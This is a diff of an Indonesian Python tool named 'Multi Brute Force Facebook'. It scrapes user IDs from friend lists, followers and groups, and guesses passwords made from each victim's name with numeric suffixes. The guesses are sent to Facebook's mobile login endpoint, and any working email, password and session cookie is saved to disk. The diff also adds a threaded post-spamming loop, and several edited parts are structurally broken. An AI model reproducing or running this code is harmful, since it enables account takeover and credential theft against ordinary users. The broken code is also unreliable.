@@ -2,7 +2,6 @@
 import requests, time, os, re, json, random,bs4,json,sys,random,datetime
 from rich.panel import Panel
 from rich import print
-from concurrent.futures import ThreadPoolExecutor
 from rich.tree import Tree
 from rich.console import Console
 import threading
@@ -78,6 +77,7 @@ def banner_logo():
 [bold blue]        \\|[bold green]Multi Brute Force Facebook[bold blue]|/""", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] Version 8.0 [bold green]<[bold yellow]<[bold red]<"))
     return 0
 ### DAPATKAN NAMA ###
+balmond = O+"["+J+"•"+O+"]"
 def dapatkan_nama(cookie, token_eaag):
     with requests.Session() as r:
         r.headers.update({
@@ -140,12 +140,14 @@ def bot_komen(cookie, token_eaag):
             return 1
 ### DAFTAR MENU ###
 def daftar_menu():
-	banner_logo()
+    banner_logo()
+    try:
         cookie = json.loads(open('Data/Cookie.json', 'r').read())['Cookie']
         token_eaag = json.loads(open('Data/Token.json', 'r').read())['Token']
         name, id = dapatkan_nama(cookie, token_eaag)
         Console(width=50, style="bold hot_pink2").print(Panel(f"""[bold white]Nama :[bold green] {name}
 [bold white]User :[bold yellow] {id}""", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Welcome) [bold green]<[bold yellow]<[bold red]<"))
+    except Exception as e:
         Console(width=50, style="bold hot_pink2").print(Panel(f"[italic red]{str(e).title()}", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Error) [bold green]<[bold yellow]<[bold red]<"));time.sleep(3.6);login_cookie()
         Console(width=50, style="bold hot_pink2").print(Panel("""[bold green]1[bold white]. Crack User Dari Publik Or Friends
 [bold green]2[bold white]. Crack User Dari Pengikut
@@ -200,43 +202,33 @@ def daftar_menu():
 ### DUMP ###
 class dump:
 
-    def __init__(self) -> None:
-        pass
-    def publik(self, userid, cookie, unit_cursor):
+    def dump_publik():
         try:
-            with requests.Session() as r:
-                r.headers.update({
-                    'upgrade-insecure-requests': '1',
-                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-                    'host': 'm.facebook.com',
-                    'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/7.0.55539 Mobile/12H321 Safari/600.1.4[FB_IAB/FB4A;FBAV/375.1.0.28.111:]',
-                    'accept-language': 'id,en;q=0.9',
-                })
-                r.cookies.update({
-                    'cookie': cookie
-                })
-                response = r.get('https://m.facebook.com/profile.php?id={}&v=friends&unit_cursor={}'.format(userid, unit_cursor)).text
-                self.all_friends = re.findall('href="fb://profile/(.*?)">(.*?)<', str(response))
-                for z in self.all_friends:
-                    self.id_friends, self.name = z[0], z[1].lower()
-                    if len(self.name) == 0 or len(self.name) > 100:
-                        continue
-                    else:
-                        if str(self.id_friends) in str(Dump):
-                            continue
-                        else:
-                            Console().print(f"[bold hot_pink2]   ╰─>[bold green] Dump {self.id_friends}/{len(Dump)} User         ", end='\r');time.sleep(0.0007)
-                            Dump.append(f'{self.id_friends}|{self.name}')
-                if 'Sorry, something went wrong.' in str(response):
-                    return 0
-                elif 'unit_cursor=' in str(response):
-                    self.unit_cursor = re.search('unit_cursor=(.*?)&', str(response)).group(1)
-                    self.publik(userid, cookie, self.unit_cursor)
-                else:
-                    return 0
-        except (KeyboardInterrupt):
-            Console().print(f"[bold hot_pink2]   ╰─>[bold yellow] KeyboardInterrupt!          ", end='\r');time.sleep(3.6)
-            return 3
+            token = open('.token.txt','r').read()
+        except IOError:
+            exit()
+        win = '# DUMP ID PUBLIK'
+        win2 = mark(win, style='cyan')
+        sol().print(win2)
+        print(x+'['+h+'•'+x+'] Ketik "me" Jika Ingin Dump ID Dari Teman')
+        pil = input(x+'['+p+'f'+x+'] Masukkan ID Facebook : ')
+        try:
+            koh2 = requests.get('https://graph.facebook.com/v2.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0]).json()
+            for pi in koh2['friends']['data']:
+                try:id.append(pi['id']+'|'+pi['name'])
+                except:continue
+                print(x+'['+h+'•'+x+'] Total : '+str(len(id)))
+                setting()
+        except requests.exceptions.ConnectionError:
+            li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
+            lo = mark(li, style='red')
+            sol().print(lo, style='cyan')
+            exit()
+        except (KeyError,IOError):
+            teks = '# PERTEMANAN TIDAK PUBLIK ATAU TOKEN RUSAK'
+            teks2 = mark(teks, style='red')
+            sol().print(teks2)
+            exit()
     ### DUMP PENGIKUT ###
     def pengikut(self, userid, cookie, token_eaag):
         try:
@@ -293,50 +285,50 @@ class dump:
         except (KeyboardInterrupt):
             Console().print(f"[bold hot_pink2]   ╰─>[bold yellow] KeyboardInterrupt!          ", end='\r');time.sleep(3.6)
             return 2
-        def setting():
-            wl = '# SETTING URUTAN ID'
-            sol().print(mark(wl, style='cyan'))
-            teks = '[01] Crack Dari Akun Tertua [mayan]\n[02] Crack Dari Akun Termuda [Mantap]'
-            tak = nel(teks, style='cyan')
-            cetak(nel(tak, title='SETTING'))
-            hu = input(x+'['+p+'f'+x+'] Pilih : ')
-            if hu in ['1','01']:
-                for bacot in id:
-                    id2.append(bacot)
-            elif hu in ['2','02']:
-                for bacot in id:
-                    id2.insert(0,bacot)
+def setting():
+        wl = '# SETTING URUTAN ID'
+        sol().print(mark(wl, style='cyan'))
+        teks = '[01] Crack Dari Akun Tertua [mayan]\n[02] Crack Dari Akun Termuda [Mantap]'
+        tak = nel(teks, style='cyan')
+        cetak(nel(tak, title='SETTING'))
+        hu = input(x+'['+p+'f'+x+'] Pilih : ')
+        if hu in ['1','01']:
+            for bacot in id:
+                id2.append(bacot)
+        elif hu in ['2','02']:
+            for bacot in id:
+                id2.insert(0,bacot)
+        else:
+            ric = '# PILIHAN TIDAK ADA DI MENU'
+            sol().print(mark(ric, style='red'))
+            exit()
+        met = '# PILIH METHOD CRACK'
+        sol().print(mark(met, style='cyan'))
+        ioz = '[01] Method B-Api\n[02] Method Mobile\n[03] Method Mbasic Selow Crack'
+        gess = nel(ioz, style='cyan')
+        cetak(nel(gess, title='METHOD'))
+        hc = input(x+'['+p+'f'+x+'] Pilih : ')
+        if hc in ['1','01']:
+            method.append('api')
+        elif hc in ['3','03']:
+            method.append('Mbasic')
+        else:
+            method.append('mobile')
+        guw = '# PILIHAN OPSI CRACK '
+        sol().print(mark(guw, style='cyan'))
+        aplik = input(x+'['+p+'f'+x+'] Tampilkan Aplikasi Terkait ? (y/t) : ')
+        if aplik in ['y','Y']:
+            taplikasi.append('ya')
+        else:
+            taplikasi.append('no')
+            osk = input(x+'['+p+'f'+x+'] Tampilkan Opsi Checkpoint? [ Not Recommended ] (y/t) : ')
+            if osk in ['y','Y']:
+                oprek.append('ya')
             else:
-                ric = '# PILIHAN TIDAK ADA DI MENU'
-                sol().print(mark(ric, style='red'))
-                #exit()
-                met = '# PILIH METHOD CRACK'
-                sol().print(mark(met, style='cyan'))
-                ioz = '[01] Method B-Api\n[02] Method Mobile\n[03] Method Mbasic Selow Crack'
-                gess = nel(ioz, style='cyan')
-                cetak(nel(gess, title='METHOD'))
-                hc = input(x+'['+p+'f'+x+'] Pilih : ')
-                if hc in ['1','01']:
-                    method.append('api')
-                elif hc in ['3','03']:
-                    method.append('Mbasic')
-                else:
-                    method.append('mobile')
-                    guw = '# PILIHAN OPSI CRACK '
-                    sol().print(mark(guw, style='cyan'))
-                    aplik = input(x+'['+p+'f'+x+'] Tampilkan Aplikasi Terkait ? (y/t) : ')
-                    if aplik in ['y','Y']:
-                        taplikasi.append('ya')
-                    else:
-                        taplikasi.append('no')
-                        osk = input(x+'['+p+'f'+x+'] Tampilkan Opsi Checkpoint? [ Not Recommended ] (y/t) : ')
-                        if osk in ['y','Y']:
-                            oprek.append('ya')
-                        else:
-                            oprek.append('no')
-                            password()
-### CRACK ###
-    def generate_password(self,name):
+                oprek.append('no')
+        passwrd()
+                
+def passwrd():
         ler = '# CRACK DIMULAI'
         sol().print(mark(ler, style='cyan'))
         krek = 'Hasil Ok  Disimpan Ke : OK/%s\nHasil Cp Disimpan Ke : CP/%s\nHidupkan/Matikan Mode Pesawat Setiap 5 Menit'%(okc,cpc)
@@ -377,47 +369,10 @@ class dump:
                                 cek_opsi()
                             else:
                                 exit()
-    #def generate_password(self, name):
-        self.password = []
-        for nama in name.split(' '):
-            if len(name) <= 5:
-                if len(nama) < 3:
-                    continue
-                else:
-                    self.password.append(nama + '123')
-                    self.password.append(nama + '1234')
-                    self.password.append(nama + '12345')
-                    self.password.append(nama + '123456')
-            else:
-                if len(nama) < 3:
-                    self.password.append(name)
-                else:
-                    self.password.append(name)
-                    self.password.append(nama + '123')
-                    self.password.append(nama + '1234')
-                    self.password.append(nama + '12345')
-                    self.password.append(nama + '123456')
-        self.password_ = []
-        for z in self.password:
-            if str(z) in str(self.password_):
-                continue
-            else:
-                self.password_.append(z)
-        return self.password_
-    ### OPEN LIST DUMP ###
-    def open_list(self):
-        try:
-            Console(width=50, style="bold hot_pink2").print(Panel("""[bold white]Hasil Crack[bold green] Ok[bold white] Tersimpan Di :[bold green] Results/Ok.txt
-[bold white]Hasil Crack[bold red] Cp[bold white] Tersimpan Di :[bold red] Results/Cp.txt""", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Results Crack) [bold green]<[bold yellow]<[bold red]"))
-            with ThreadPoolExecutor(max_workers=35) as (V):
-                for z in Dump:
-                    self.email, self.nama = z.split('|')[0], z.split('|')[1]
-                    self.password = self.generate_password(self.nama)
-                    V.submit(self.main, Dump, self.email, self.password)
-            Console().print("\r[bold white][[bold green]Selesai[bold white]]                           ");exit()
-        except:exit()
+    
+    
     ### MAIN ###
-    def crack(idf,pwv):
+def crack(idf,pwv):
         global loop,ok,cp
         bi = random.choice([u,k,kk,b,h,hh])
         pers = loop*100/len(id2)
@@ -530,107 +485,6 @@ class dump:
             except requests.exceptions.ConnectionError:
                 time.sleep(31)
                 loop+=1
-                
-    def main(self, total, email, password):
-        try:
-            for pws in password:
-                self.useragent = self.realme_useragent(total = 1)
-                with requests.Session() as r:
-                    r.headers.update({
-			    'host': 'mbasic.facebook.com',
-			    'cache-control': 'max-age=0',
-			    'upgrade-insecure-requests': '1',
-			    'origin': 'https://mbasic.facebook.com',
-			    'content-type': 'application/x-www-form-urlencoded',
-			    'user-agent': self.useragent,
-			    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-			    'sec-fetch-site': 'same-origin',
-			    'sec-fetch-mode': 'cors',
-			    'sec-fetch-user': 'empty',
-			    'sec-fetch-dest': 'document',
-			    'referer': 'https://mbasic.facebook.com/login/?email=',
-			    'accept-encoding':'gzip, deflate br',
-			    'accept-language':'en-GB,en-US;q=0.9,en;q=0.8'})
-                    response = r.get('https://m.alpha.facebook.com/login.php?').text
-                    try:
-                        self.jazoest = re.search('name="jazoest" value="(\d+)"', str(response)).group(1)
-                        self.m_ts = re.search('name="m_ts" value="(.*?)"', str(response)).group(1)
-                        self.li = re.search('name="li" value="(.*?)"', str(response)).group(1)
-                        self.fb_dtsg = re.search('{"dtsg":{"token":"(.*?)"', str(response)).group(1)
-                        self.lsd = re.search('name="lsd" value="(.*?)"', str(response)).group(1)
-                        self.__a = re.search('"encrypted":"(.*?)"', str(response)).group(1)
-                        self.__spin_t = re.search('"__spin_t":(\d+),', str(response)).group(1)
-                    except (AttributeError) as e:
-                        Console().print("[bold hot_pink2]   ╰─>[bold red] Terjadi Kesalahan!                    ", end='\r');time.sleep(2.0);continue
-                    data = {
-                        'm_ts': self.m_ts,
-                        'li': self.li,
-                        'try_number': 0,
-                        'unrecognized_tries': 0,
-                        'email': email,
-                        'prefill_contact_point': email,
-                        'prefill_source': 'browser_dropdown',
-                        'prefill_type': 'password',
-                        'first_prefill_source': 'browser_dropdown',
-                        'first_prefill_type': 'contact_point',
-                        'had_cp_prefilled': True,
-                        'had_password_prefilled': True,
-                        'is_smart_lock': False,
-                        'bi_xrwh': 0,
-                        'encpass': '#PWD_BROWSER:0:{}:{}'.format(self.__spin_t, pws),
-                        'fb_dtsg': self.fb_dtsg,
-                        'jazoest': self.jazoest,
-                        'lsd': self.lsd,
-                        '__dyn': '',
-                        '__csr': '',
-                        '__req': random.choice(['1','2','3','4','5']),
-                        '__a': self.__a,
-                        '__user': 0
-                    }
-                    r.headers.update({
-                        'cookie': ("; ".join([str(x)+"="+str(y) for x,y in r.cookies.get_dict().items()])),
-                        'sec-fetch-site': 'same-origin',
-                        'origin': 'https://m.alpha.facebook.com',
-                        'accept': '*/*',
-                        'content-type': 'application/x-www-form-urlencoded',
-                        'x-fb-lsd': self.lsd,
-                        'referer': 'https://m.alpha.facebook.com/login.php?',
-                        'content-length': str(len(("&").join([ "%s=%s" % (x, y) for x, y in data.items() ])))
-                    })
-                    response2 = r.post('https://m.alpha.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100', data = data, allow_redirects = True)
-                    #open('Response.txt', 'a+').write(f'{email}|{pws}|{r.cookies.get_dict()}\n')
-                    if 'c_user' in r.cookies.get_dict().keys():
-                        try:
-                            self.cookie = (";".join([str(x)+"="+str(y) for x,y in r.cookies.get_dict().items()]))
-                        except:pass
-                        tree = Tree("\r[bold white]LOGIN SUCCESS                      ", style = "bold white")
-                        tree.add(f"[bold green]Email : {email}").add(f"[bold green]Password : {pws}", style = "bold white")
-                        tree.add(f"[bold green]Cookie : {self.cookie}", style = "bold white")
-                        print(tree)
-                        self.success.append(f'{email}|{pws}|{self.cookie}')
-                        open('Results/Ok.txt', 'a+').write(f'{email}|{pws}|{self.cookie}\n')
-                        break
-                    elif 'checkpoint' in r.cookies.get_dict().keys():
-                        tree = Tree("\r[bold white]LOGIN CHECKPOINT                      ", style = "bold white")
-                        tree.add(f"[bold red]Email : {email}").add(f"[bold red]Password : {pws}", style = "bold white")
-                        tree.add(f"[bold red]Useragent : {self.useragent}", style = "bold white")
-                        print(tree)
-                        self.checkpoint.append(f'{email}|{pws}|{self.useragent}')
-                        open('Results/Cp.txt', 'a+').write(f'{email}|{pws}|{self.useragent}\n')
-                        break
-                    else:
-                        continue
-            self.looping += 1
-            Console().print(f"[bold hot_pink2]   ╰─>[bold white] Crack {str(len(Dump))}/{self.looping} Ok:-[bold green]{len(self.success)}[bold white] Cp:-[bold red]{len(self.checkpoint)}[bold white]              ", end='\r')
-        except (requests.exceptions.ConnectionError, requests.exceptions.ChunkedEncodingError):
-            Console().print("[bold hot_pink2]   ╰─>[bold red] Koneksi Error!                    ", end='\r');time.sleep(7.9);self.main(total, email, password)
-        except Exception as e:
-            Console().print(f"[bold hot_pink2]   ╰─>[bold red] {str(e).title()}!                    ")
-    ### REALME USERAGENT ###
-    def realme_useragent(self, total):
-        for _ in range(total):
-            self.useragent = ('Mozilla/5.0 (Linux; Android 12; M2010J19SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36')
-        return self.useragent
     
 def crack2(idf,pwv):
     global loop,ok,cp
@@ -840,9 +694,208 @@ def cek_opsi():
                     li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
                     sol().print(mark(li, style='red'))
                     exit()
-                    dah = '# DONE'
-                    sol().print(mark(dah, style='cyan'))
-                    exit()
+        dah = '# DONE'
+        sol().print(mark(dah, style='cyan'))
+        exit()
+        
+    def lah():
+        print("\r"+balmond+m+" Total ID : "+str(len(id))+"                     ")
+        input(balmond+m +" Mode Pesawat 5 Detik Dan Tekan Enter Untuk Mulai Crack ")
+        pass
+    setting()
+    
+def lah():
+    print("\r"+balmond+m+" Total ID : "+str(len(id))+"                     ")
+    input(balmond+m +" Mode Pesawat 5 Detik Dan Tekan Enter Untuk Mulai Crack ")
+    pass
+setting()
+ 
+def grup():
+    win = '# PASTIKAN ID GROUP PUBLIK'
+    win2 = mark(win, style='cyan')
+    sol().print(win2)
+    id = input(""+balmond+h+" Id Atau User Name Grup : ")
+    ua = 'Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gba'
+    miskinlu = {"user-agent": ua}
+    url = "https://m.facebook.com/groups/"+id
+    ses = requests.Session()
+    try:
+        gn = parser(ses.get(url, headers=miskinlu).text, "html.parser")
+    except requests.exceptions.ConnectionError:
+        print(balmond+m+" Koneksi Internet Terputus..")
+        time.sleep(0.5)
+        exit()
+    berr = gn.find("title")
+    berr2 = berr.text.replace(" | Facebook","").replace(" Grup Publik","")
+    if berr2=='Masuk Facebook':
+        print(balmond+m+" Limit, Silahkan Mode Pesawat Dan Coba Lagi..")
+        time.sleep(0.5)
+        exit()
+    elif berr2=='Kesalahan':
+        print(balmond+m+" Grup Tidak Ditemukan..")
+        time.sleep(0.5)
+        exit()
+    else:pass
+    print(""+balmond+p+" Nama Grup : "+berr2)
+    ggs = gn.find_all('table')
+    ang = []
+    for ff in ggs:
+        anggo = ff.text
+        bro = anggo.replace('Anggota','')
+        try:
+            mex = int(bro)
+            jumlah = ang.append(mex)
+        except:
+            pass
+        if len(ang)==0:
+            print(balmond+h+" Anggota : -")
+        else:
+            print(balmond+h+" Anggota : "+str(ang[0]))
+            grup1(url)
+
+def grup1(urls):
+	use = []
+	ses = requests.Session()
+	print(""+balmond+p+" Jika Stack, Mode Pesawat 5 Detik")
+	print(balmond+p+" Sedang Mengumpulkan ID")
+	print(balmond+p+" Tekan CTRL + C Untuk Stop")
+	while True:
+		try:
+			ua = 'Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gba'
+			miskinlu = {"user-agent": ua}
+			try:
+				url = use[0]
+			except:
+				url = urls
+			set = parser(ses.get(url, headers=miskinlu).text, "html.parser")
+			bf2 = set.find_all('a')
+			for g in bf2:
+				css = str(g).split('>')
+				if 'Lihat Postingan Lainnya</span' in css:
+					bcj = str(g).replace('<a href="','').replace('amp;','')
+					bcj2 = bcj.split(' ')[0].replace('"><img','')
+			tes = set.find_all('table')
+			for cari in tes:
+				liatnih = cari.text
+				spl = liatnih.split(' ')
+				if 'mengajukan' in spl:
+					idsiapa = re.findall('content_owner_id_new.\w+',str(cari))
+					idyou =	idsiapa[0].replace('content_owner_id_new.','')
+					namayou = liatnih.replace(' mengajukan pertanyaan .','')
+					idku = idyou+'|'+namayou
+					if idku in id:
+						continue
+					else:
+						id.append(idku)
+						print(("\r"+balmond+h+" { "+k+"Proses Mengambil ID "+str(len(id))+h+" }"), end="");sys.stdout.flush()
+				elif '>' in spl:
+					idsiapa = re.findall('content_owner_id_new.\w+',str(cari))
+					idyou =	idsiapa[0].replace('content_owner_id_new.','')
+					namayou = liatnih.split(' > ')[0]
+					idku = idyou+'|'+namayou
+					if idku in id:
+						continue
+					else:
+						id.append(idku)
+						print(("\r"+balmond+h+" { "+O+"Mengumpulkan ID "+str(len(id))+h+" }"), end="");sys.stdout.flush()
+				else:
+					continue
+			try:
+				link_ = bcj2
+				use.insert(0,'https://m.facebook.com'+link_)
+			except:
+				girang = set.find('title')
+				girang2 = girang.text.replace(" | Facebook","").replace(" Grup Publik","")
+				if girang2=='Masuk Facebook':
+					pass
+				else:
+					lah()
+		except requests.exceptions.ConnectionError:
+			try:
+				time.sleep(31)
+			except KeyboardInterrupt:
+				lah()
+		except KeyboardInterrupt:
+			lah()
+
+saat_ini = datetime.datetime.now()
+
+def run(link, token):
+
+    while True:
+
+        headers = {
+
+            'authority': 'graph.facebook.com',
+
+            'cache-control': 'max-age=0',
+
+            'sec-ch-ua-mobile': '?0',
+
+            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.66 Safari/537.36',
+
+        }
+
+        try:
+
+          response = requests.post(f'https://graph.facebook.com/me/feed?link={link}&published=0&access_token={token}', headers=headers)
+
+          print(response.text)
+
+        except:
+
+          sys.exit()
+
+def main():
+
+    banner_logo()
+
+    print('\x1b[0;94m┌───────────────────────────────────┐')
+    #link = input('Link Posts : ')
+    token = input('├──[•] Token Facebook :\x1b[0;92m ')
+
+   # token = input('Token FB : ')
+    link = input('\x1b[0;94m├──[•] Link Postingan :\x1b[0;92m ')
+    print('\x1b[0;94m└───────────────────────────────────┘')
+
+    number_thread = int(input('[✓]––>ISI AJA 20 BG  :\x1b[0;92m  '))
+
+    for i in range(number_thread):
+        thread = threading.Thread(target=run, args=(link, token))
+#        print('SINGEK',thread.start())
+        thread.start()
+        
+def follower():
+    try:
+        token = open('.token.txt', 'r').read()
+    except IOError:
+        exit()
+
+    win = '# DUMP ID DARI FOLLOWER'
+    win2 = mark(win, style='cyan')
+    sol().print(win2)
+    print(x + '[' + h + '•' + x + '] Ketik "me" Jika Ingin Dari Follower Mu')
+    pili = input(x+'['+p+'f'+x+'] Masukkan ID Facebook : ')
+    try:
+        koh2 = requests.get('https://graph.facebook.com/' + pili + '?fields=subscribers.limit(5000)&access_token=' + tokenku[0]).json()
+        for pi in koh2['subscribers']['data']:
+            try:
+                id.append(pi['id'] + '|' + pi['name'])
+            except:
+                continue
+
+        print(x + '[' + h + '•' + x + '] Total : ' + str(len(id)))
+        setting()
+    except requests.exceptions.ConnectionError:
+        li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
+        lo = mark(li, style='red')
+        sol().print(lo, style='cyan')
+        exit()
+    except (KeyError, IOError):
+        teks = '# FOLLOWER TIDAK PUBLIK ATAU TOKEN RUSAK'
+        teks2 = mark(teks, style='red')
+        sol().print(teks2)
+        exit()
 
 def uagent():
 	print ("\n[01]. Ganti user agent ")
@@ -882,6 +935,107 @@ def uas(__Aang__Sayang__Laura__):
 	else:
 		print ('\n[!] Yang bener bang');time.sleep(2)
 		uas(__Aang__Sayang__Laura__)
+  
+def main(self, total, email, password):
+        try:
+            for pws in password:
+                self.useragent = self.realme_useragent(total = 1)
+                with requests.Session() as r:
+                    r.headers.update({
+			    'host': 'mbasic.facebook.com',
+			    'cache-control': 'max-age=0',
+			    'upgrade-insecure-requests': '1',
+			    'origin': 'https://mbasic.facebook.com',
+			    'content-type': 'application/x-www-form-urlencoded',
+			    'user-agent': self.useragent,
+			    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+			    'sec-fetch-site': 'same-origin',
+			    'sec-fetch-mode': 'cors',
+			    'sec-fetch-user': 'empty',
+			    'sec-fetch-dest': 'document',
+			    'referer': 'https://mbasic.facebook.com/login/?email=',
+			    'accept-encoding':'gzip, deflate br',
+			    'accept-language':'en-GB,en-US;q=0.9,en;q=0.8'})
+                    response = r.get('https://m.alpha.facebook.com/login.php?').text
+                    try:
+                        self.jazoest = re.search('name="jazoest" value="(\d+)"', str(response)).group(1)
+                        self.m_ts = re.search('name="m_ts" value="(.*?)"', str(response)).group(1)
+                        self.li = re.search('name="li" value="(.*?)"', str(response)).group(1)
+                        self.fb_dtsg = re.search('{"dtsg":{"token":"(.*?)"', str(response)).group(1)
+                        self.lsd = re.search('name="lsd" value="(.*?)"', str(response)).group(1)
+                        self.__a = re.search('"encrypted":"(.*?)"', str(response)).group(1)
+                        self.__spin_t = re.search('"__spin_t":(\d+),', str(response)).group(1)
+                    except (AttributeError) as e:
+                        Console().print("[bold hot_pink2]   ╰─>[bold red] Terjadi Kesalahan!                    ", end='\r');time.sleep(2.0);continue
+                    data = {
+                        'm_ts': self.m_ts,
+                        'li': self.li,
+                        'try_number': 0,
+                        'unrecognized_tries': 0,
+                        'email': email,
+                        'prefill_contact_point': email,
+                        'prefill_source': 'browser_dropdown',
+                        'prefill_type': 'password',
+                        'first_prefill_source': 'browser_dropdown',
+                        'first_prefill_type': 'contact_point',
+                        'had_cp_prefilled': True,
+                        'had_password_prefilled': True,
+                        'is_smart_lock': False,
+                        'bi_xrwh': 0,
+                        'encpass': '#PWD_BROWSER:0:{}:{}'.format(self.__spin_t, pws),
+                        'fb_dtsg': self.fb_dtsg,
+                        'jazoest': self.jazoest,
+                        'lsd': self.lsd,
+                        '__dyn': '',
+                        '__csr': '',
+                        '__req': random.choice(['1','2','3','4','5']),
+                        '__a': self.__a,
+                        '__user': 0
+                    }
+                    r.headers.update({
+                        'cookie': ("; ".join([str(x)+"="+str(y) for x,y in r.cookies.get_dict().items()])),
+                        'sec-fetch-site': 'same-origin',
+                        'origin': 'https://m.alpha.facebook.com',
+                        'accept': '*/*',
+                        'content-type': 'application/x-www-form-urlencoded',
+                        'x-fb-lsd': self.lsd,
+                        'referer': 'https://m.alpha.facebook.com/login.php?',
+                        'content-length': str(len(("&").join([ "%s=%s" % (x, y) for x, y in data.items() ])))
+                    })
+                    response2 = r.post('https://m.alpha.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100', data = data, allow_redirects = True)
+                    #open('Response.txt', 'a+').write(f'{email}|{pws}|{r.cookies.get_dict()}\n')
+                    if 'c_user' in r.cookies.get_dict().keys():
+                        try:
+                            self.cookie = (";".join([str(x)+"="+str(y) for x,y in r.cookies.get_dict().items()]))
+                        except:pass
+                        tree = Tree("\r[bold white]LOGIN SUCCESS                      ", style = "bold white")
+                        tree.add(f"[bold green]Email : {email}").add(f"[bold green]Password : {pws}", style = "bold white")
+                        tree.add(f"[bold green]Cookie : {self.cookie}", style = "bold white")
+                        print(tree)
+                        self.success.append(f'{email}|{pws}|{self.cookie}')
+                        open('Results/Ok.txt', 'a+').write(f'{email}|{pws}|{self.cookie}\n')
+                        break
+                    elif 'checkpoint' in r.cookies.get_dict().keys():
+                        tree = Tree("\r[bold white]LOGIN CHECKPOINT                      ", style = "bold white")
+                        tree.add(f"[bold red]Email : {email}").add(f"[bold red]Password : {pws}", style = "bold white")
+                        tree.add(f"[bold red]Useragent : {self.useragent}", style = "bold white")
+                        print(tree)
+                        self.checkpoint.append(f'{email}|{pws}|{self.useragent}')
+                        open('Results/Cp.txt', 'a+').write(f'{email}|{pws}|{self.useragent}\n')
+                        break
+                    else:
+                        continue
+            self.looping += 1
+            Console().print(f"[bold hot_pink2]   ╰─>[bold white] Crack {str(len(Dump))}/{self.looping} Ok:-[bold green]{len(self.success)}[bold white] Cp:-[bold red]{len(self.checkpoint)}[bold white]              ", end='\r')
+        except (requests.exceptions.ConnectionError, requests.exceptions.ChunkedEncodingError):
+            Console().print("[bold hot_pink2]   ╰─>[bold red] Koneksi Error!                    ", end='\r');time.sleep(7.9);self.main(total, email, password)
+        except Exception as e:
+            Console().print(f"[bold hot_pink2]   ╰─>[bold red] {str(e).title()}!                    ")
+    ### REALME USERAGENT ###
+def realme_useragent(self, total):
+        for _ in range(total):
+            self.useragent = ('Mozilla/5.0 (Linux; Android 12; M2010J19SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36')
+        return self.useragent
 		
 if __name__ == '__main__':
     try:
